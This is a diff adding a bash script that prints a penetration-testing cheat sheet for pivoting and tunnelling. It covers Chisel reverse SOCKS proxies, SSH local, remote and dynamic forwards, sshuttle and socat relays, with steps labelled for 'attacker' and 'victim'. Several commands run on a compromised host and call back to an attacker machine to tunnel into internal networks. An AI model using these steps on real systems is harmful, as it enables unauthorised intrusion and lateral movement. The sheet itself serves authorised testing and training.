@@ -1,0 +1,65 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── CHISEL & SSH TUNNELING ────────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Chisel SOCKS5 Proxy ──────────────────────────────${NC}"
+echo -e "  Note: Attacker (Kali):"
+echo -e "  ${GREEN}./chisel server -p 8888 --reverse --socks5${NC}"
+echo -e "  Note: Victim:"
+echo -e "  ${GREEN}./chisel client <KALI_IP>:8888 R:socks${NC}"
+echo -e "  Note: Then: proxychains nmap -vvv -sT -Pn -p <PORT> <INTERNAL_IP>"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Chisel Single Port Forward ───────────────────────${NC}"
+echo -e "  Note: Attacker:"
+echo -e "  ${GREEN}./chisel server -p 8888 --reverse${NC}"
+echo -e "  Note: Victim:"
+echo -e "  ${GREEN}./chisel client <KALI_IP>:8888 R:127.0.0.1:<LOCAL_PORT>:<INTERNAL_IP>:<TARGET_PORT>${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Chisel Cross-Compile (Windows) ───────────────────${NC}"
+echo -e "  ${GREEN}env GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags '-s -w'${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── SSH Dynamic Port Forwarding (SOCKS) ──────────────${NC}"
+echo -e "  Note: /etc/proxychains4.conf: socks5 127.0.0.1 1080"
+echo -e "  ${GREEN}sudo ssh -f -N -D 1080 <USER>@<PIVOT_IP>${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── SSH Local Port Forward ───────────────────────────${NC}"
+echo -e "  ${GREEN}ssh -N -L 0.0.0.0:<LOCAL_PORT>:<INTERNAL_IP>:<REMOTE_PORT> <USER>@<PIVOT_IP>${NC}"
+echo -e "  Note: Forwards LOCAL_PORT on Kali -> INTERNAL_IP:REMOTE_PORT via pivot"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── SSH Remote Port Forward ──────────────────────────${NC}"
+echo -e "  Note: Run on victim:"
+echo -e "  ${GREEN}ssh -N -R 127.0.0.1:<KALI_PORT>:<INTERNAL_IP>:<SERVICE_PORT> <KALI_USER>@<KALI_IP>${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── SSH Dynamic Remote Port Forward ──────────────────${NC}"
+echo -e "  Note: Run on victim (SOCKS on Kali):"
+echo -e "  ${GREEN}ssh -N -R 9998 <KALI_USER>@<KALI_IP>${NC}"
+echo -e "  Note: /etc/proxychains4.conf: socks5 127.0.0.1 9998"
+echo -e "  ${GREEN}proxychains nmap -vvv -sT --top-ports=20 -Pn -n <INTERNAL_IP>${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── sshuttle ─────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}sshuttle -r <USER>@<PIVOT_IP> <INTERNAL_CIDR>${NC}"
+echo -e "  ${GREEN}sshuttle -r <USER>@<PIVOT_IP> 10.10.10.0/24 192.168.1.0/24${NC}"
+echo -e "  ${GREEN}sshuttle -r root@<PIVOT> <CIDR> --ssh-cmd 'ssh -i id_rsa'${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Socat Relay ──────────────────────────────────────${NC}"
+echo -e "  ${GREEN}socat -ddd TCP-LISTEN:<LOCAL_PORT>,fork TCP:<INTERNAL_IP>:<REMOTE_PORT>${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
